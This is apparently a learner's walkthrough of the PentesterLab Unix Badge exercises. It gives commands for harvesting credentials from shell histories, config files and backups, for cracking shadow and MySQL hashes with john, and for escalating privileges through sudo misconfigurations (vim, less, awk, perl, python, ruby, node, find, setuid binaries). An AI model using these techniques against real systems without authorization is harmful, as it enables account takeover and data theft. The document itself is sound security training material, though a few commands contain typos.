## Unix Badge
### Unix 00
Login using creds `pentesterlab:pentesterlab`, there's a `key.txt` file in the users home folder, run `cat key.txt` and copy the contents of the file into the score box on the challenge page. 

[Challenge URL](https://pentesterlab.com/exercises/unix_00/scoring)
Sidebar: I'm making a choice to not include the key in future notes, chances are the key will be different by the time I'm reviewing/reworking old challenges, and also having the key on hand defeats the purpose of actually solving the challenge again in the first place. 

### Unix 01
[Challenge URL](https://pentesterlab.com/exercises/unix_01/course)

Login using standard creds `pentesterlab:pentesterlab`, use `cd` to move into the `victim` home directory with the key, then `cat key.txt`

### Unix 02
[Challenge URL](https://pentesterlab.com/exercises/unix_02/scoring)

Login with standard creds. We're abusing an improper implementation of unix file permissions. We don't have read-permission to the `victim` home folder, but we do have execute-permission. We can `cd` into the `victim` dir, but we get a permission-denied error when trying to run `ls` to view the contents. However, because we know the `key.txt` file exists in the `victim` dir, and we have execute-permission, we can `cat key.txt` and view the contents of the specific file.

### Unix 03
[Challenge URL](https://pentesterlab.com/exercises/unix_03/scoring)

Here we're scoping out the `victim` user's `.bash_history` file, which is where `bash` stores a record of commands the user has ran. How many commands and for how long is specified on a per-user basis, and may vary wildy. However, often passwords or other sensitive info can be found in the shell history, whether through inadverdent copy&paste or the use of a pass or key as an argument. `cd` to the `victim` home dir, run `cat .bash_history` and look for an entry in the form of the key UUID.

### Unix 04
[Challenge URL](https://pentesterlab.com/exercises/unix_04/course)

Similar to the previous challenge, we're looking for the key in `.bash_history`, however this time on a system with many more users. Instead of individually checking every home dir, we can use the `find` command to check every dir for us, looking for a file by name (or many other options). We'll use `find /home -name .bash_history`.
`cd` to the returned `victim` dir (this round `victim73`) and run `cat .bash_history`.

### Unix 05
[Challenge URL](https://pentesterlab.com/exercises/unix_05/course)

This round we're looking for the key in either a user's `.bashrc` file. We're told there is an an `alias` setup by the user to use a custom `check` command to check the validity of a key (This is assuming a massive amount of recon being done already, but we're told this info directly by the challenge.)
We'll be using `find` again, but with a few more options associated with it, as all ~78 `victim` home dirs have a `.bashrc` file.
To find the one we need, we'll use the `-exec` flag with `find` which allows us to run another unix command on/with/for every file `find` returns. 
Our command is `find /home -name .bashrc -exec grep key {} \;`
This is running `grep` for the pattern `key`. Everything after `key` is a part of the `-exec` portion of the command, `{}` gets replaced by by every filename that `find` returns, which `grep` is then run against. The `\;` tells `find -exec` that it's the end of arguments for the command being exec'd, the `\` itself is an escape character that's (usually) needed to prevent our shell from interpreting `;` as a separate special char instead of as a termination of the exec'd command. 

### Unix 06
[Challenge URL](https://pentesterlab.com/exercises/unix_06/course)

Here we're told a user has defined an environment variable for the key in their `.bashrc` file. We'll be using a very similar command as we did in unix05, but because we're searching for an environment variable, our `grep` pattern will be `PTLAB_KEY`, which we're told is the name of the environment variable the user set.
We can use the command `find /home -name .bashrc -exec grep -i ptlab_key {} \;` to return the key for the challenge. The `-i` tells `grep` to use a case-*in*sensitive search, so it will return both upper and lower-case matches. We could exclude the `-i` flag and use `PTLAB_KEY` in upper case instead in this instance. 

### Unix 07
[Challenge URL](https://pentesterlab.com/exercises/unix_07/course)

Here we're informed about other shells, other than bash, available to users of a unix system. In this case, we're looking for the user using `zsh`, so we'll be looking for a `.zsh_history` file.
The command we'll use is `find /home -name .zsh_history -exec cat {} \:`.
Using `-exec cat` here will automatically print out the contents of the `.zsh_history` file when `find` locates it for us. 

### Unix 08
[Challenge URL](https://pentesterlab.com/exercises/unix_08/course)

This challenge is about reconning the `/etc/passwd` file to find a user that has their "home" directory outside of the `/home` dir. While this is very uncommon for a human-account, service or daemons that require an account or shell may have their "home" account anywhere.
If we manually scan `/etc/passwd`, we find a few service/systemd accounts at the top, a *lot* of victim users with a normal `/home` dir, and victim99 conveniently at the bottom of the list with `/srv/victim99:/bin/bash`. This tells us the `victim99` user's "home" folder is based in the `/srv` directory, with `bash` as their shell.
Since we know we're looking for an account that explicitly is *not* based in the `/home` dir, we can use the command `grep -v /home /etc/passwd` to filter out all of the entries that contain the string `/home`, the `-v` flag tells grep to return all lines in the file that *do not match* whatever pattern we were searching for. This returns a much shorter list of entries than just running `cat /etc/passwd`.
Because `victim99` is the only normal user account returned, it's reasonable to assume that it's their `/srv/victim99` dir that we need to search.
Using `find /srv -name .bashrc -exec grep -i key {} \;` doesn't return anything, however if we search again for `.bash_history` files using `find /srv -name .bash_history -exec grep -i key {} \;` we get the key from the user running what looks like a custom script named `check_ptlab_key`.

### Unix 09
[Challenge URL](https://pentesterlab.com/exercises/unix_09/course)

Here we're searching for a relatively common mistake on the CLI; accidentally entering a password directly in the CLI instead of in the password prompt. We're told to look for a call to the `passwd` command in a user's `.bash_history` file. If we fun something like `find /home -name .bash_history -exec grep passwd {} \;`, in this instance we unfortunately get a lot of commands involving the `/etc/password` file. To get around this, we can use `^passwd` as our search string, the `^` char tells grep to only return lines *starting* with `passwd`, however this only gives us the call the `passwd` itself, the *actual* password (and key for this challenge) is likely on the following line. So, we can use `grep -A 1 ^passwd`, this `-A 1` tells grep to the line matching the pattern, and 1 line *after* the matched-line (using -B 1 would print one line *before* the matched-line, the number for either can be any number for more context.). Our full command ends up being `find /home -name .bash_history -exec grep -A 1 ^passwd {} \;`. 

### Unix 10
[Challenge URL](https://pentesterlab.com/exercises/unix_10/course)

This round we're told the `root` user left a copy of a backup file archive in the `/tmp` folder. Because everything in `/tmp` gets automatically removed after a reboot, sensitive info can often be left here in systems with a lot of up-time.
Once we move into the `/tmp` folder, we find a `gzip`'d `tar` archive. Using `tar -xf backup.tgz` gives us a new `./home/victim/` folder with a `secrets.txt` file that contains the key for this challenge.

### Unix 11
[Challenge URL](https://pentesterlab.com/exercises/unix_11/course)

Very similar to unix10, however this time we're inspecting the `/var/tmp` folder for a file called `backup.tbz`, a `tar` archive compressed using `bzip`.

Run `tar -xf backup.tbz` and then `cat` the contents of the `./home/victim/secrets.txt` file for the key.

### Unix 12
[Challenge URL](https://pentesterlab.com/exercises/unix_12/course)

We're told the `root` user left a `backup.bz2` file in one of the temp directories, once unzipped, it reveals another backup file with no file extension. We can use the `file` command to get the details of the unknown file format (file extensions are typically irrelevant to a unix system, and mostly exist for user convenience.)
We can either check `/tmp` and `/var/tmp` manually, or run `find / -name backup.bz2 2>/dev/null` to find the file. The `2>/dev/null` redirects all of the `permission denied` errors for dir's our user does not have read access to, and since we're telling `find` to start with the `/` (root) directory, there's a lot.
Once the file is found in `/tmp`, run `bzip2 -d backup.bz2`, while the command gives us an error, we still get the new file called `backup`.

Running `file backup` reveals it is a `cpio` archive. The top of `cpio --help` output gives a few basic examples, and tells us we need to use the `<` shell redirect to point `cpio` to our `backup` file. However, to get `cpio` to extract the directory to our current (`/tmp`) dir, we need to append the `--no-absolute-filenames` flag, as well as the `-d` flag to instruct it to make new directories as needed. So our full command ends up `cpio -ivd --no-absolute-filenames < backup`. This gives us a new `/tmp/home/victim` folder, containing a `secrets.txt` file with the key for this challenge.

### Unix 13
[Challenge URL](https://pentesterlab.com/exercises/unix_13/course)

This challenge introduces `cronjobs`, which allows sysadmins to run specific jobs or scripts on a periodic basis (daily, every five minutes, every startup, etc). We're told the `root` user made a script to backup the contents of the `/home` folder every day, and that a key is hard-coded into the script used to encrypt the backup. We can find `cronjobs` in the corresponding `/etc/cron.*` directories, in this case the only one present is `/etc/cron.daily`. There's 4 scripts in the directory, but we're intrested in the `backup` script, the contents of which are;
```bash
#!/bin/bash
tar -zcvf /tmp/backup.tgz /home/victim
openssl enc -aes256 -k P3NT35T3RL48 -in /tmp/backup.tgz -out /tmp/backup.tgz.enc
rm /tmp/backup.tgz
```
This is making a `tar` archive named `/tmp/backup.tgz` of the `/home/victim` dir, then using `openssl` with to encrypt the archive with the `aes256` algo and `P3NT35T3RL48` for the encryption key, then using `rm` to remove the unencrypted backup.
Running `openssl --help` only gives a clue to check the `enc` command, but running `openssl enc --help` gives a list of options, which shows we can use the `-d` flag to specify decryption of a file, and the `-k` flag to specify the encryption key for the file. We have to specify `-in $FILENAME` for the input file, and `-out $FILENAME` for the name of the newly decrypted file.
To successfully decrypt the .enc file, we must specify every parameter used to encrypt it in the first place.
Our command ends up `openssl enc -aes256 -d -k P3NT35T3RL48 -in backup.tgz.enc backup.tgz`. If the algo is not specified (`-aes256` in this case) the file will unencrypt because the key is correct, but we'll be left with garbage data. Run `file backup.tgz` on the newly created unencrypted archive and ensure the output is something along the lines of `backup.tgz: gzip compressed data` and not a generic `data`.
Run `tar -xf backup.tgz` followed by `cat ./home/victim/secrets.txt` to retrieve the key for this challenge.

### Unix 14
[Challenge URL](https://pentesterlab.com/exercises/unix_14/course)
This challenge, all we're told is that the `root` user created a backup of the `victim`'s home dir, and that we'll need to use something in the contents of the backup to use the `su` (switch user) command to become the victim user to gain access to the key in their home dir.
We can use `find / -name backup 2>/dev/null` to find the `backup` file in `/var/tmp`, and running `file` reveals it's a `gzip` archive.
Run `tar -xf backup` to extract the files. There is a file called `credentials.txt` in the new `/var/tmp/home/victim` folder, with a reminder of what the user's password is. Run `su victim` and enter the password at the prompt, you will now be the `victim` user. We can run `cd` (by itself, with no arguments) as a shortcut to navigate to the `victim`'s current home dir, from there we find another copy of the `credentials.txt` file and a `key.txt` file, which contains the key for this challenge. 

### Unix 15
[Challenge URL](https://pentesterlab.com/exercises/unix_15/course)

Here the `root` user left an unsecured copy of the `/etc/shadow` file. The `shadow` file contains the hashes of all user passwords on a unix system. We're told the algo used for the `victim` user is `DES`, which is weak and very out of date. As a result, we can use `john-the-ripper` or just `john` to crack it, even with limited CPU/GPU resources. 

Because `john` isn't installed in the pentesterlab instance, we need to copy the `shadow` file, or at least the line of the `victim` user, into a local file in our VM.

Switching to the `/etc` dir and running `ls -la | grep shadow` reveals a few files, one being `shadow.backup` that we have read/write permissions on. `cat` the backup file and copy the last line that contains the hash of the `victim` password, and copy it into a local file in the VM.

With the local file, in my case named `victimPassHashed`, run `john victimPassHashed --format=descrypt`, you should get some output about `john` cracking the hash, followed by the `victim` user's password and user name, in a format similar to
```bash
# john program output
password_Here              (Username Here)
# more john program output
```

With the `victim` password, run `su victim` then enter the password at the prompt. `cd` to the `victim` home dir, and run `cat key.txt` to get the key for this challenge. 

### Unix 16
[Challenge URL](https://pentesterlab.com/exercises/unix_16/course)

This challenge is almost identical to unix15, the only difference being the algo used to hash the password is instead `md5` instead of `DES`. Password hash algo's are denoted by special identifies at the beginning of the line in the `/etc/shadow` file;

|    Hash Algo  |    Prefix     |
|:----------:|:-------------:|
|   `MD5`    |     `$1$`     |
| `blowfish` | `$2$ or $2a$` |
| `SHA-256`  |     `$5$`     |
| `SHA-512`  |     `$6$`     |

Follow the same steps as the last challenge, find the backup of `/etc/shadow`, copy the `victim` hash to a local file, then run `john $FILENAME --format=md5crypt`, change users with the new password via `su victim` and then grab the key for the challenge from the `victim` user home folder. 

### Unix 17
[Challenge URL](https://pentesterlab.com/exercises/unix_17/course)

This round we're told the server is being used to run `apache tomcat`, and is a lesson in hardcoded credentials. We need to find the config file for `tomcat`, which we're told is named `tomcat-users.xml` and should contain the password for the `admin` user. The password will also serve as the key for this challenge.

Run `find /etc -name tomcat-users.xml` to quickly find the config file, then use `cat` to dump the contents, password/key for the challenge will be located towards the end of the file.

### Unix 18
[Challenge URL](https://pentesterlab.com/exercises/unix_18/course)

Here we're digging through an unsecured `mysql` database.
We can connect to the `mysql` shell via `mysql -u root`, from there we're using `mysql` specific commands, that will always end with a semi-colon `;`.

In order to find the `admin` password, we'll need to run the following commands, one after the other
```mysql
show databases;       # list all databases in the instance
use pentesterlab;     # select the 'pentesterlab' database
show tables;          # show tables in selected database
select * from users;  # Display information/key:pair in all tables
```

The `admin` user in the `users` table is the key for the challenge.

### Unix 19
[Challenge URL](https://pentesterlab.com/exercises/unix_19/course)

This challenge is almost identical to unix18, however the `mysql root` account has a (very weak) password set. We're told the pass is an anagram of `root`, which most likely is `toor`.
Run `mysql -u root -p` and enter `toor` in the password prompt.
Once in the `mysql` shell, run;
```mysql
show databases;
use data;
show tables;
select * from logins;
```
The `admin` password displayed is the key for the challenge. 

### Unix 20
[Challenge URL](https://pentesterlab.com/exercises/unix_20/course)

Here we're chaining multiple techniques to get the `admin` user password. First, we have to guess a common and insecure password for the `mysql` account, then exploit a misconfiguration where the `mysql` user has a valid shell on the server (instead of `/bin/false`). If we run `cat /etc/passwd`, we see the `mysql` account is assigned a `bash` shell. We can use `su mysql` to change users, using the password `mysql` (guessed password) at the prompt. 

Once we're logged in as the `mysql` user, we're told to run `strings` on the file `/var/lib/mysql/mysql/user.MYD`. Running `file` reveals it as `user.MYD: Hitachi SH big-endian COFF executable, not stripped`, an executable binary file related to `mysql` internal workings. Running `strings /var/lib/mysql/mysql/user.MYD` will print out all of the human-readable bytes/chars within the binary.

This gives us a hash of the `mysql root` user password (the `root` user within `mysql` databases, not `root` of the underlying server.) The hash is broken into two lines, so we'll need to copy both, combine them into one line in a local file, and then use `john` to crack the hash.
The output of `strings /var/lib/mysql/mysql/user.MYD` should resemble
```bash
localhost
root*1077836286BA88247B6F8CD2 # First part of root hash
6c732c6044b7
root 
127.0.0.1
root
root
localhost
debian-sys-maint*D1461CE757B9B67AC344204A3A7FE9F9DB17A35C
516DEECDA1B4E27C             # Second part of root hash
```
Copy the line starting with `root*` and the string from the last line of the file, combine them into one line in a new file like
```bash
root:*1077836286BA88247B6F8CD2516DEECDA1B4E27C
```
Be sure to add a `:` after root in the file, i.e. `root:*` so that `john` will recognize it as a password hash. Then we'll use `john` on the new file containing only that single line.

With my version of `john`, it was able to automatically detect the hash format just using `john $FILENAME`, however if we needed to know the specific format we could use `john --list=formats` to give us the full list of formats `john` supports. Using `john --list=formats | grep -i mysql` would narrow down the extensive list to
```bash
multibit, mysqlna, mysql-sha1, mysql, net-ah, nethalflm, netlm, netlmv2
```

With the `mysql root` password cracked, we can use `mysql -u root -p` and enter the password at the prompt to get access to the `mysql` databases to find the `admin` password. We'll use a familiar set of commands;
```mysql
show databases;
use pentesterlab;
show tables;
select * from users;
```
to get the `admin` pass/key for the challenge. 

### Unix 21
[Challenge URL](https://pentesterlab.com/exercises/unix_21/course)

We're told the `root` user for `mysql` does *not* have a password set, and that once we have access to the `mysql shell`, we're trying to read the contents of the file `/var/lib/mysql-files/key.txt` user the `mysql load_file( )` function. When using the `load_file( )` function, the *full file path* must be specified, the file must be on the same server as the `mysql` instance, and `mysql` must have access to the file.

Run `mysql -u root` to drop into the `mysql shell`, from there we can run `help load_file` to get usage info about the function. To get the contents of the file, we have to specify the `select` keyword at the beginning of our query, so from within the `mysql shell`, we'll run `select load_file('/var/lib/mysql-files/key.txt');` to get the key for this challenge.

### Unix 22
[Challenge URL](https://pentesterlab.com/exercises/unix_22/course)

This challenge is using a `postgres sql` server, and we're told the `postgres` user has a trivial password. Once we have access to the `postgres` user, we can run `psql` to connect to the local database. From there, we're looking for the password for the `admin` account.

`postgres` uses a different syntax from `mysql`, we can use the following commands to move about the database;
-   `\list` to list the databases
-   `\c [DATABASE]` to select the database `[DATABASE]`
-   `\d` to list the tables
-   `SELECT` to select items in the database
-   `\q` to quit the `psql` shell

We start with `su postgres`, using `postgres` for the user password, then `psql` to connect to the database. We'll use
```postgres
\list                    # List databases
\c pentesterlab          # select pentesterlab database
\d                       # list tables in database
SELECT * FROM users;     # select everything from user table
# Key output here
```

### Unix 23
[Challenge URL](https://pentesterlab.com/exercises/unix_23/course)

Here we're told a webapp is running out of the `/var/www` directory, and that credentials for the underlying database are hardcoded somewhere in the source code.

Once we gain access to the database, we'll need to create out our own table, copy the contents from the `/var/lib/postgresql/9.4/key.txt` file into the table, then `select` that entry in the table to read the contents. After, we'll use `DROP TABLE $TABLENAME` to remove the suspicious table from the database.

Once logged in and moved to the `/var/www` dir, instead of manually combing through all of the `php` files, we can use `find /var/www -name "*.php" -exec grep -i pass {} \;` to search all of the file with a `.php` extension for the string `pass`.
This will give us a much smaller amount of text to scan, and reveals a username/password combo of `photoblog/photoblog`.

We can use `psql -U photoblog -W` using `photoblog` for the password at the prompt. From here, we'll use `CREATE TABLE lmao(t text);` to create a new table, then `COPY lmao FROM '/var/lib/postgresql/9.4/key.txt';` to copy the contents of the key file into the table, followed by `SELECT * FROM lmao;` to get the key. Finally, we'll use `DROP TABLE lmao;` to remove our table from the database.

### Unix 24
[Challenge URL](https://pentesterlab.com/exercises/unix_24/course)

We've got another `sql` challenge in the form of an `sqlite 3` database that has been copied and left in the `/tmp` dir. We'll load the database using `sqlite3 database.db`. We'll use `.tables` in the `sqlite3` shell to list the tables, then `SELECT * FROM users;` to get the `admin` password/key for this challenge. 

### Unix 25
[Challenge URL](https://pentesterlab.com/exercises/unix_25/course)

Here we're exploiting a bad `sudo` (Switch User DO) config, in which we're allowed to run the command `sudo -u victim /bin/bash`, because we can directly call `bash` as the other user, we can run essentially *any* command as that user.

Whenever we've got `sudo` access, we want to start with `sudo -l`, which will list what we're allowed to do as our current user with `sudo`. In this case, our output is;
```bash
Matching Defaults entries for pentesterlab on 8042b4bbc78c:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pentesterlab may run the following commands on 8042b4bbc78c: 
	(victim) /bin/bash
```
This is telling us we can use run the command `/bin/bash` as the user `victim`, which effectively gives us full access to that user account. 

Run `sudo -u victim /bin/bash` and you'll be dropped into a new `bash` shell as the `victim` user. `cd` to the home folder, and `cat` the `key.txt` file for the key to this challenge. 

### Unix 26
[Challenge URL](https://pentesterlab.com/exercises/unix_26/course)

Here, we're allowed to run `/usr/bin/find` as the `victim` user. However, because `find` has the `-exec` option, we can use this to run start a shell as the `victim` user, or use `find` to `cat` the contents of the `key.txt` file.

To get the key directly, we can use `sudo -u victim find /home -name key.txt -exec cat {} \;`, which will run `find` and all following `-exec` commands as the `victim` user.

Or, if we wanted a full shell as the `victim` user, we can use `sudo -u victim find /home -name .bashrc -exec /bin/bash \;`. We're using `.bashrc` as the file to search for in this case as it's almost guaranteed to be found by `find`, which we need to happen in order for the `-exec /bin/bash \;` to execute. Once in the shell, `cd` to the `victim` home dir and `cat key.txt`.

### Unix 27
[Challenge URL](https://pentesterlab.com/exercises/unix_27/course)

We're doing more privesc via bad `sudo` configs. Running `sudo -l` shows we can run `/usr/bin/vim` as the `victim` user. This gives us *three* ways to get access to the `key.txt` file in the `victim`'s home dir.

First, we'll load the `key.txt` file directly from the command line with;
`sudo -u victim vim /home/victim/key.txt` which will open the `key.txt` file and reveal the key immedietly.

Second, we can open vim as the `victim` user with `sudo -u victim vim`, then from within the `vim` session, type `:r /home/victim/key.txt`. The `:` char in `vim` is used to specify a `vim` built in command, in this case `:r` being to read in a new file.

Third, we'll use `sudo -u victim vim` again, but this time we'll use `:!/bin/bash` which will drop us into a shell as the `victim` user, because we launched `vim` as the `victim` user in the first place via `sudo`. From here, `cd` to the `victim` home dir and `cat key.txt`

To quit vim (without saving) use `:q!`

### Unix 28
[Challenge URL](https://pentesterlab.com/exercises/unix_28/course)

Another `sudo` misconfig, this time with the `less` command, which is a unix-pager system and prints out contents of a file to STDOUT/the command line.
We'll use `sudo -u victim less /home/victim/key.txt` to print out the contents of the file directly. Or, we can start `less` as the `victim` user, then type `!/bin/bash` which will start a new shell as the `victim` user for us. From there, `cd` home dir and `cat key.txt`

### Unix 29
[Challenge URL](https://pentesterlab.com/exercises/unix_29/course)

More `sudo` misconfigs, with more `awk`. `awk` is a pattern matching/regex/processing language/command, the intricacies of which are way beyond this scope.
However, we can use `sudo -u victim awk '{print $1}' /home/victim/key.txt` (`'{print $1}'` tells `awk` to print the first argument) to print the file contents directly, our use `awk` to invoke a shell via `sudo -u victim awk 'BEGIN {system("/bin/bash")}'` then do the usual switch to `victim` home dir to `cat` the `key.txt` file. 

### Unix 30
[Challenge URL](https://pentesterlab.com/exercises/unix_30/course)

Here we'll be chaining a `sudo` misconfiguration and abusing unix `setgid/setuid` (set group/user id) programs. A `setuid` program will run with the permissions of the user/group that owns/belongs to the group that owns the file. The permissions on these programs look like the following;
`-rwsr-xr-x. 1 root root 32552 Jul 22  2021 /usr/bin/passwd`
The `s` bit in the first `-rwsr` column denotes it as a `setuid` program.

For this challenge, we're allowed to run `/bin/chmod` and `/bin/cp` as the `victim` user, allowing us to change file permissions (`chmod`) and copy files (`cp`). We'll write a short `C` prgram;
```C
int main(void)  
{  
system("cat /home/victim/key.txt");  
}
```
This will run the `cat` command following `system`. To get it to run as the `victim` user with a `setuid` bit.

Once you've got the above into a file, use `gcc -o /tmp/lmao lmao.c` (output file name first, then input filename.) to compile your file, and output it as a new compiled `C` program, in this case `lmao`.

Next, we'll use `sudo -u victim cp lmao lmaovic` to copy it into a new file, which is now owned by the `victim` user. Then, we'll use `sudo -u victim chmod +xs lmaovic` to set the `setuid/gid` bits on the file. Now, we can run the file a our `pentester` lab user, but because of the `setuid`, it will run with the same permissions as the `victim` user, and thus print out the key. If we try to run the first copy of our file (owned by pentesterlab), we'll get a permission denied error as we're trying to read a file from a directory we don't have access to.

### Unix 31
[Challenge URL](https://pentesterlab.com/exercises/unix_31/course)

Here we're using `sudo` with the `perl` language. We can either use `sudo -u victim perl -e 'print `cat /home/victim.txt`'`
Formatting is fucked up, but it's a single quote `'` before `print` and at the very end of the statement, and backticks (`` ``) before `cat` and at the end of `txt`, before the final single-quote.

Alternatively, we can use `sudo -u victim perl -e '`/bin/bash`'` with the same single-quote/backtick scheme, however we won't get any output to STDOUT with this shell, but because we know the file exists, we can copy the file as `victim` user to the `/tmp` directory, where our `pentesterlab` user has permissions, use `chmod 777` on the copied file to give everyone every permission on it, then exit the shell and read the contents as our `pentesterlab` user.

### Unix 32
[Challenge URL](https://pentesterlab.com/exercises/unix_32/course)

This challenge we're abusing another `sudo` misconfig that allows us to run `python`. Using `python`'s REPL (read-evaluate-print-loop). We start with `sudo -u victim python` to drop into a REPL as the `victim` user.
We're told to import the `call` module from `subprocess`, we do this with
```python
>>> from subprocess import call
## Now we can run most system commands like so;
>>> call(['uname'])
## We could also use the 'os' module;
>>> import os
>>> os.system('uname')
## To get a victim user shell;
>>> call(['/bin/bash'])
## or
>>> os.system('/bin/bash')
## To directly print key
>>> os.system('cat /home/victim/key.txt')
## or
>>> call(['cat', '/home/victim/key.txt'])
```

### Unix 33
[Challenge URL](https://pentesterlab.com/exercises/unix_33/course)

Again with the `sudo` misconfigs, this time with `ruby`. To start a REPL with ruby as the `victim` user, we'll use `sudo -u victim ruby -e 'require "irb" ; IRB.start(__FILE__)'`, from there, we'll use backticks to wrap system commands. We should now have a shell prompt along the lines of `irb(main):001:0>`, from there we'll use `cat /home/victim/key.txt` to read the key, or we could use `/bin/bash` to spawn a shell as the victim user.

### Unix 34
[Challenge URL](https://pentesterlab.com/exercises/unix_34/course)

And one more time with feeling, `sudo` misconfig using `node`/javascript.
We're fortunately given a code snippet to start with;
```node
var exec = require('child_process').exec;  
exec('[COMMAND]', function (error, stdOut, stdErr) {  
console.log(stdOut);  
});
```

Our full command will be `sudo -u victim node` to drop into a `node` shell, followed by `'var exec = require('child_process').exec; exec('cat /home/victim/key.txt', function (error, stdOut, stdErr) {console.log(stdOut); });'`

We could also do this as a single command with;
`sudo -u victim node -e "var exec = require('child_process').exec; exec('cat /home/victim/key.txt', function (error, stdOut, stdErr) {console.log(stdOut); });"`

